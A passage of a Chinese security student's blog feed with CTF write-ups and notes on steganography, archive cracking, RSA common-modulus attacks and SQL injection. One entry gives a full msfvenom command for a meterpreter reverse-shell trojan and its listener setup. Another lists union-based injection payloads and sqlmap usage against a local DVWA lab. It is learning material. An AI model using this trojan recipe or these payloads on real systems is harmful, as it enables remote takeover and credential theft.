<figcaption></figcaption>    </figure>  <p>复制到txt文件，导入010editor，导出为pyc文件</p><p>pyc文件反汇编<br>pip install uncompyle  #安装反汇编模块<br>uncompyle6 1.pyc &gt; 111.py</p>    <figure class="figure-image">      <img src="/picture/misc44.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>拿到flag是AlphaLab</p>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali渗透工具制作木马病毒</title>
      <link href="/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/"/>
      <url>/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<h2 id="1、msfvenom生成远控木马"><a href="#1、msfvenom生成远控木马" class="headerlink" title="1、msfvenom生成远控木马"></a>1、msfvenom生成远控木马</h2><p>msfvenom是用来生成后门软件，在目标机上执行后门，在本地监听上线。(msfvenom在shell里使用，不是在msfconsole终端)</p>    <figure class="figure-image">      <img src="/picture/misc22.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <p>msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.88.123   lport=9999  -f  exe  -o   demo.exe<br>lhost攻击机的地址，lport：1~65535自己任选，不要选已在工作中的端口    </p><p>查询kali的ip地址<br>ifconfig或ip add</p>    <figure class="figure-image">      <img src="/picture/misc23.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc24.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>现在木马就生成好了</p>    <figure class="figure-image">      <img src="/picture/misc25.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>再点击open folder就可以看到demo.exe了</p><h2 id="2、开启监听"><a href="#2、开启监听" class="headerlink" title="2、开启监听"></a>2、开启监听</h2><p>在msfconsole中开启监听，等待受害者运行上钩<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.169.88.123  (注意空格不要多输)<br>set lport 9999<br>run</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2022/01/11/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/01/11/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="判断是否存在SQL注入漏洞"><a href="#判断是否存在SQL注入漏洞" class="headerlink" title="判断是否存在SQL注入漏洞"></a>判断是否存在SQL注入漏洞</h2><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p><p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p><h2 id="如果利用SQL注入漏洞"><a href="#如果利用SQL注入漏洞" class="headerlink" title="如果利用SQL注入漏洞"></a>如果利用SQL注入漏洞</h2><h5 id="1、判断数据库列数-order-by-column-num"><a href="#1、判断数据库列数-order-by-column-num" class="headerlink" title="1、判断数据库列数  order by [column_num]"></a>1、判断数据库列数  order by [column_num]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p><p>当表中只有两列，order by 3就会出错</p><h5 id="2、联合查询其他信息-union-select-sql1-sql2"><a href="#2、联合查询其他信息-union-select-sql1-sql2" class="headerlink" title="2、联合查询其他信息  union select [sql1] [sql2]"></a>2、联合查询其他信息  union select [sql1] [sql2]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p><h5 id="3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’"><a href="#3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’" class="headerlink" title="3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’"></a>3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p><h5 id="4、联合查询信息-union-query-sql"><a href="#4、联合查询信息-union-query-sql" class="headerlink" title="4、联合查询信息  union [query_sql]"></a>4、联合查询信息  union [query_sql]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p><p>cookie信息怎么看：</p>    <figure class="figure-image">      <img src="/picture/web1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA共模攻击和gmpy2、libnum常用函数</title>
      <link href="/2022/01/10/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
      <url>/2022/01/10/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><p>当两个用户使用相同的模数N、不同的私钥时，加密同一明文消息时，即存在同模攻击</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>设两个用户的公钥分别为e<sub>1</sub>和e<sub>2</sub>，且两者互质。明文信息为m，密文分别为:</p>    <figure class="figure-image">      <img src="/picture/c2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>​    </p><p>当攻击者截获c<sub>1</sub>和c<sub>2</sub>后，就可以恢复出明文。用扩展欧几里得算法求出re<sub>1</sub>+se<sub>2</sub>=1 mod  n 的两个整数r和s，由此可得:</p>    <figure class="figure-image">      <img src="/picture/c3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>                                        <p>​                                </p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2>    <figure class="figure-image">      <img src="/picture/c1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#数字n、c1、c2都太长了，我直接去了</span><br>n=<br>e1= <span class="hljs-number">2333</span><br>e2= <span class="hljs-number">23333</span><br>c1=<br>c2=<br>gcd, s, t = gmpy2.gcdext(e1, e2)<br><span class="hljs-comment">#广义欧几里得求出s,t  gcdext返回值为e1,e2最大公因数和s、t。 s*e1+t*e2=(e1,e2)</span><br><br><span class="hljs-comment">#s和t中必然有一位负数，将其变为正数，要使等式仍然成立，取逆元</span><br><span class="hljs-keyword">if</span> s &lt; <span class="hljs-number">0</span>:<br>    s = -s<br>    c1 = gmpy2.invert(c1, n)<br><span class="hljs-keyword">if</span> t &lt; <span class="hljs-number">0</span>:<br>    t = -t<br>    c2 = gmpy2.invert(c2, n)<br>plain = gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n) % n<br><span class="hljs-built_in">print</span>(long_to_bytes(plain))<br><span class="hljs-comment">#将long转换成字符串，是Crypto.Util.number中的方法，这里用不了libnum.n2s(plain)因为plain太长了</span><br></code></pre></td></tr></table></figure><h2 id="gmpy2常用函数"><a href="#gmpy2常用函数" class="headerlink" title="gmpy2常用函数"></a>gmpy2常用函数</h2><ul><li>n=invert(m,phi)求mod phi的逆元 </li><li>pow(m,e,n)求c^d mod n </li><li>gmpy2.is_prime(n) 素性检测</li><li>gmpy2.gcd(a,b)  欧几里得算法，最大公约数 </li><li>gmpy2.gcdext(a,b)  扩展欧几里得算法</li><li>gmpy2.iroot(x,n)  x开n次根</li><li>gmpy2.mpz(n) 初始化一个大整数</li></ul><h2 id="libnum常用函数"><a href="#libnum常用函数" class="headerlink" title="libnum常用函数"></a>libnum常用函数</h2><ul><li><p>libnum.invmod(a,b)   求mod b的逆元</p></li><li><p>数字型（不论是十六进制还是十进制）与字符串之间的转换：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>s=<span class="hljs-string">&quot;flag&#123;pcat&#125;&quot;</span><br><span class="hljs-built_in">print</span> libnum.s2n(s)<br><br><br><span class="hljs-keyword">import</span> libnum<br>n=<span class="hljs-number">0x666c61677b706361747d</span><br><span class="hljs-built_in">print</span> libnum.n2s(n)<br></code></pre></td></tr></table></figure><ul><li> 二进制与字符串之间的转换：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>b=‘01110000011000110110000101110100‘<br><span class="hljs-built_in">print</span> libnum.b2s(b)<br><span class="hljs-comment">#二进制的位数最好是8的倍数</span><br><br><br><span class="hljs-keyword">import</span> libnum<br>b=‘01110000011000110110000101110100‘<br><span class="hljs-built_in">print</span> libnum.b2s(b)<br><span class="hljs-comment">#二进制的位数最好是8的倍数</span><br></code></pre></td></tr></table></figure><ul><li>质数&amp;因数分解</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">print</span> libnum.generate_prime(1024)<br><br><span class="hljs-builtin-name">print</span> libnum.factorize(1024)<br></code></pre></td></tr></table></figure><blockquote><p>本篇博客大部分摘自CTFwiki，记录的目的是为了加深自己的理解，也是为了方便自己的使用</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界simpleRAR</title>
      <link href="/2022/01/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CsimpleRAR/"/>
      <url>/2022/01/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CsimpleRAR/</url>
      
        <content type="html"><![CDATA[    <figure class="figure-image">      <img src="/picture/misc13.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  拿到压缩包里面只有一个flag.txt内容为flag is not here<p>把压缩包丢入010editor</p>    <figure class="figure-image">      <img src="/picture/misc10.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>这是上一篇压缩文件分析中提到的的，有时候给出的RAR文件的头部各个字块会故意给错导致无法识别<br>文件块的第三个字节为类型块，也叫头类型<br>头类型是0x72表示是标记块<br>头类型是0x73表示是压缩文件头块<br>头类型是<font color='red'>0x74</font>表示是文件头块<br>头类型是0x75表示是注释头块</p><p>因为flag.txt文件的内容为flag is not here，所以可以找到下一个文件的文件头，把7A改成74即可看到了secret.png</p>    <figure class="figure-image">      <img src="/picture/misc11.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>查看exif无果，把secret丢入010editor中，文件头是gif类型的，更改后缀名(但其实不更改也可以正常打开，我也不知道为啥)，然后看不出来什么了。</p><p>把图片丢入stegsolve中，更改颜色通道,看到了这个</p>    <figure class="figure-image">      <img src="/picture/misc12.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>这里我还在想是不是高度错误了，尝试爆破宽高不知道为什么爆破不出来，不知道是不是因为是gif类型的</p><p>看看题目双图层</p><p>打开Photoshop，果然看到另一个图层保存为png后丢入stegsolve中</p>    <figure class="figure-image">      <img src="/picture/misc14.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>合并就可以得到一张完整的二维码了，这里我发现了一个更方便的方法(因为我之前用ps和ppt试过)，就是用snipaste粘粘到桌面上就行了</p>    <figure class="figure-image">      <img src="/picture/misc9.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  ]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc压缩文件处理</title>
      <link href="/2022/01/09/misc%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/"/>
      <url>/2022/01/09/misc%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1、伪加密"><a href="#1、伪加密" class="headerlink" title="1、伪加密"></a>1、伪加密</h2><p>如果压缩文件是加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过标识符来显示的，在每个文件的文件目录字段有一位专门标识了文件是否加密，将其设置为00表示该文件未加密，如果成功解压则表示文件为伪加密，如果解压出错说明文件为真加密</p><p>操作方法：使用winhex或010editor，找到文件头第九第十个字符，将其修改为0000. (其中50是第一个字符)<br>1、使用winhex打开文件搜索十六进制504B0102，可以看到每个加密文件的文件头字段<br>2、从50开始，第九个第十个字符为加密字段，将其设置为0000即可变为无加密状态<br>3、RAR文件由于有头部检验，使用伪加密时打开文件会出现报错，使用winhex修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，将该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密</p><h2 id="2、破解压缩包密码"><a href="#2、破解压缩包密码" class="headerlink" title="2、破解压缩包密码"></a>2、破解压缩包密码</h2><p>明文攻击指已经知道加密的zip中部分文件的明文内容，利用这些内容推测出密钥并解密zip文件的攻击方法，相比与暴力破解，这种方法在破解密码较为复杂的压缩包时的效率更高</p><p>例如:假设一个加密的压缩包中有两个文件readme.txt和flag.txt，其中flag.txt的内容时我们希望知道的，而我们拥有readme.txt的明文内容，使用上述两个文件可以进行明文攻击<br>1、将readme.txt的明文文件压缩，变成readme1.zip<br>2、打开archpr，攻击类型选择明文，明文文件路径选择readme1.zip<br>(使用该方法要注意：1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致 2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致)</p><h2 id="3、RAR头部故意给错"><a href="#3、RAR头部故意给错" class="headerlink" title="3、RAR头部故意给错"></a>3、RAR头部故意给错</h2><p>有时候给出的RAR文件的头部各个字块会故意给错导致无法识别<br>文件块的第三个字节为类型块，也叫头类型<br>头类型是0x72表示是标记块<br>头类型是0x73表示是压缩文件头块<br>头类型是<font color='red'>0x74</font>表示是文件头块<br>头类型是0x75表示是注释头块</p>    <figure class="figure-image">      <img src="/picture/misc15.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  ]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc图片隐写</title>
      <link href="/2022/01/08/misc%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
      <url>/2022/01/08/misc%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="1、LSB-最低有效位Least-Significant-Bit"><a href="#1、LSB-最低有效位Least-Significant-Bit" class="headerlink" title="1、LSB(最低有效位Least Significant Bit)"></a>1、LSB(最低有效位Least Significant Bit)</h2><p>LSB替换隐写基本思想使用嵌入的秘密信息取代载体图像的最低比特位，原来的7个高位平面与替代秘密信息的最低位平面组成含隐藏信息的新图形</p><p>例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像素中的最低的1bit。在人眼中看来是看不住来区别的，也把信息隐藏起来了。如：把A转成16进制的0*61在转成二进制的01100001，在修改为红色通道的最低位为这些二进制串。<br>像素三原色(RGB)<br><strong>通过修改像素中最低为的1bit来达到隐藏的效果</strong><br>工具:stegsolve、zsteg、wbstego4(通常用于.bmp和.pdf)、Python脚本</p>    <figure class="figure-image">      <img src="/picture/misc6.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>因为不确定Red、Blue、Green的排列顺序，所以需要依次选择RGB、BGR……</p><p>zsteg(这个方法很厉害)<br>zsteg是一个命令行工具，linux下输入gem install zsteg进行安装<br>使用:zsteg 图片名<br>zsteg会把所有可能情况RGB、BGR……中的文本信息依次显示出来</p><h2 id="2、CRC检验出错"><a href="#2、CRC检验出错" class="headerlink" title="2、CRC检验出错"></a>2、CRC检验出错</h2><p>当PNG文件头正常但无法正常打开文件，可能是CRC校验出错。可以尝试通过TweakPNG打开PNG，会弹处校验错误的提示，比如显示CRC是fe1a5ab6，正确的是b0a7a9f1，打开问winhex或010editor找到CRC值fe1a5ab6将其改为b0a7a9f1</p><h2 id="3、图片高度或宽度错误"><a href="#3、图片高度或宽度错误" class="headerlink" title="3、图片高度或宽度错误"></a>3、图片高度或宽度错误</h2><p>有时CRC没有错误，但是图片的高度或宽度发生了错误，需要通过CRC计算出正确的宽度和高度</p>    <figure class="figure-image">      <img src="/picture/misc7.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>前八个字节89 50 4E <strong>47 0D 0A 1A 0A</strong>为png的文件头，<strong>该段格式是固定的</strong><br>前四个字节<strong>00 00 00 0D</strong>（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，<strong>该段格式是固定的</strong><br>之后的四个字节<strong>49 48 44 52</strong>（即为ASCII码的IHDR）是文件头数据块的标示，<strong>该段格式也是固定的</strong></p><p><font size=3 color='purple'>之后进入13位数据块，前8个字节<strong>00 00 01 69 00 00 03 25</strong>中：前四个字节00 00 01 69代表该图片的宽，<strong>该段数据是由图片的实际宽决定的</strong>，后四个字节00 00 03 25代表该图片的高，<strong>该段数据是由图片的实际高度决定的</strong></font><br>剩余的4位<strong>98 6B 9E 93</strong>为该png的CRC检验码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#crc爆破宽高的脚本</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br>crcbp=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2048</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2048</span>):<br>        data=crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>]+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32=binascii.crc32(data)&amp;<span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc32== <span class="hljs-number">0x00BF122A</span>:  <span class="hljs-comment">#这里的值也需要根据图片的crc值进行更改</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),<span class="hljs-built_in">hex</span>(j))<br><br></code></pre></td></tr></table></figure><h2 id="4、图片加密"><a href="#4、图片加密" class="headerlink" title="4、图片加密"></a>4、图片加密</h2><p>Bftools<br>在windows的cmd下，对加密过的图片文件进行解密<br>格式:<br>Bftools.exe  decode  braincopter  要加密的图片名称 -output  输出文件名<br>Bftools.exe  run  上一步输出文件名</p><p>Stegdetect<br>Stegdetect工具探测加密方式，主要用于分析<strong>PEG</strong>文件，因此用stegdetcct用于检测到通过JSteg、JPHide、OutGuess、Invisible Secret、F5、appenddX和Camouflage这些隐写工具隐藏的信息<br>格式：<br>.\stegdetect  xxx.jpg<br>.\stegdetect  -s  敏感度  xxx.jpg<br> .\必不可少<br>  #敏感度最大为10，敏感度越大检测结果越准确，所以一般都是stegdetect  -s 10.0  xxx.jpg      <figure class="figure-image">      <img src="/picture/misc8.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <br>在stegdetect.exe所在位置右键“在Windows终端打开”,因为我下载了PowerShell</p>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc文件操作</title>
      <link href="/2022/01/07/misc%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E9%9A%90%E5%86%99/"/>
      <url>/2022/01/07/misc%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="文件类型识别、取证"><a href="#文件类型识别、取证" class="headerlink" title="文件类型识别、取证"></a>文件类型识别、取证</h2><p>1、file命令<br>当文件没有后缀名或者有后缀名而无法正常打开时，根据识别出的文件类型来修改后缀名即可正常打开文件(在Linux操作系统下使用该命令)<br>格式:  file 文件名</p><p>2、strings命令<br>打印文件中可打印的字符，经常用来发现文件中的一些提示信息或是一些特殊的编码信息，常常用来发现题目的突破口<br>配合grep命令探测指定信息：<br>strings 文件名 | grep -i XXCTF<br>例如：strings webshell.pcapng | grep {      #查找带有{ 的字符串      </p><p>3、十六进制查看器<br>通过winhex、010editor或notepad++可以查看文件头类型，根据文件头类型判断出文件类型</p>    <figure class="figure-image">      <img src="/picture/misc1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p><font size=1 color='red'>winhex试用期已过窗口绕过方法：点击details(详细)，把打开的窗格最小化之后，即可正常使用winhex</font><br><font size=1 color='red'>notepad++查看十六进制需要下载一个HEX-Editor插件</font></p><p>4、文件头残缺/错误<br>通常文件无法正常打开有两种情况，一种是文件头部残缺，另一种是文件头部字段错误。针对文件头部残缺的情况，使用winhex程序添加相应的文件头，支队头部字段错误可以找一个相同类型的文件进行替换<br>一般使用file命令，只显示data，那么就极有可能是文件头残缺或错误</p>    <figure class="figure-image">      <img src="/picture/misc2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <hr><h2 id="文件分离操作"><a href="#文件分离操作" class="headerlink" title="文件分离操作"></a>文件分离操作</h2><p>1、Binwalk工具<br>binwalk是Linux下用来分析和分离文件的工具，可以快速分辨文件是否有多个文件合并而成，并将文件进行分离，如果分离成功会在目标文件的目录的同目录下生成一个形如<br>_文件名_extracted等文件目录，目录中有分离的文件<br>分析方法: binwalk filename<br>分离方法: binwalk -e filename</p><p>2、foremost<br>如果binwalk无法正确分离除文件，可以使用foremost，将目标文件复制到kali中，成功执行后，会在目标文件的文件目录下生成我们设置的目录，目录中会按文件类型分离出文件<br>用法: foremost 文件名 -o  输出目录名</p><p>3、dd<br>当文件自动分离出错或者因为其他原因无法自动分离时，可以使用dd实现文件手动分离<br>格式: dd  if=源文件  of=目标文件名  bs=1  skip=开始分离的字节数<br>参数说明:<br>if=file    #输入文件名，缺省为标准输入<br>of=file   #输出文件名，缺省为标准输出<br>bs=bytes  #同时设置读写块的大小为bytes,可代替ibs和obs<br>skip=blocks  #从输入文件开头跳过blocks个块后再开始复制</p>    <figure class="figure-image">      <img src="/picture/misc3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>这里最后2.txt中内容为12345</p>    <figure class="figure-image">      <img src="/picture/misc4.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>真正使用的时候需要配合binwalk使用，binwalk可以分析出文件分离的起始和终止位置</p><p>4、Winhex<br>除了使用dd外，还可以使用winhex实现手动文件分离，将目标文件拖入winhex中，找到要分离的部分，点击复制即可</p><p><font size=1 color="blue">当给定有个txt文件，里面是16进制的压缩包，这时可以使用010editor导入16进制，再保存成压缩包即可</font></p><hr><h2 id="文件合成操作"><a href="#文件合成操作" class="headerlink" title="文件合成操作"></a>文件合成操作</h2><p>Linux下的文件合并<br>linux下通常对文件名相似的文件要进行批量合并<br>格式：cat  合并的文件&gt;输出的文件</p><p>完整性检测:linux下计算文件md5<br>格式:md5sum 文件名<br>(这个操作的原因是因为，你不知道所给部分文件的合并顺序，出题人可能会给出最后合并文件的md5值，这样就可以达到检测合并顺序是否正确的效果)</p>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金盾杯</title>
      <link href="/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF/"/>
      <url>/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>这是我的第一次CTF比赛(所有writeup是我们整个队伍的writeup)</p><h3 id="1、hello-world"><a href="#1、hello-world" class="headerlink" title="1、hello_world"></a>1、hello_world</h3><p>拿到文件，看到只有一张图片</p>    <figure class="figure-image">      <img src="/picture/金盾杯/hello1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>常规操作，一般首先查看图片属性</p>    <figure class="figure-image">      <img src="/picture/金盾杯/hello2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>有提示信息666c61677b35383561626436653435316134623466393665636630343036303136376264397d<br>0~f之间，首先猜测是十六进制数（如果不行的话备选方案是Base64）<br>十六进制转字符串得到flag{585abd6e451a4b4f96ecf04060167bd9}</p><p>然后说一下当时我解题时候的想法<br>我拿到一个图片，一般喜欢stegsolve</p>    <figure class="figure-image">      <img src="/picture/金盾杯/hello3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>然后我就看啊看，看到很多类似这种的，我以为图片下面有一个二维码<br>就打开kali</p><p>binwalk + 文件路径/文件名</p><p>foremost+文件路径/文件名<br>发现并没有，然后我就不知道该怎么办了，哈哈</p><hr><h3 id="2、Hi-There"><a href="#2、Hi-There" class="headerlink" title="2、Hi There"></a>2、Hi There</h3><p>拿到文件，里面只有一个txt文档Hhbe1cie93bfTFbcc2hl94e2ea1c91rgab5fei3432Tse498<br>仔细观察看到这串看到这串字符有题目的标题和’F’’l’’a’’g’</p><p><strong>H</strong>hbe1c<strong>i</strong>e93bf<strong>T</strong>Fbcc2<strong>h</strong>l94e2<strong>e</strong>a1c91<strong>r</strong>gab5f<strong>e</strong>i3432Tsesza5498<br>Hhbe1cie93bfT<strong>F</strong>bcc2h<strong>l</strong>94e2e<strong>a</strong>1c91r<strong>g</strong>ab5fei3432Tse498</p><p>且都是隔五个出现一次的，所以就猜测是栏栅加密，且栏数是5</p>    <figure class="figure-image">      <img src="/picture/金盾杯/there1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>但发现只是普通的栏栅加密好像不行<br>试一下枚举解密</p>    <figure class="figure-image">      <img src="/picture/金盾杯/there2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>所以提交flag{b9b91a3ee3c4cb441bce9539cf221f28}</p><p>这道题也说一下我最开始的想法，我是只看到了’f’ ‘l’ ‘a’ 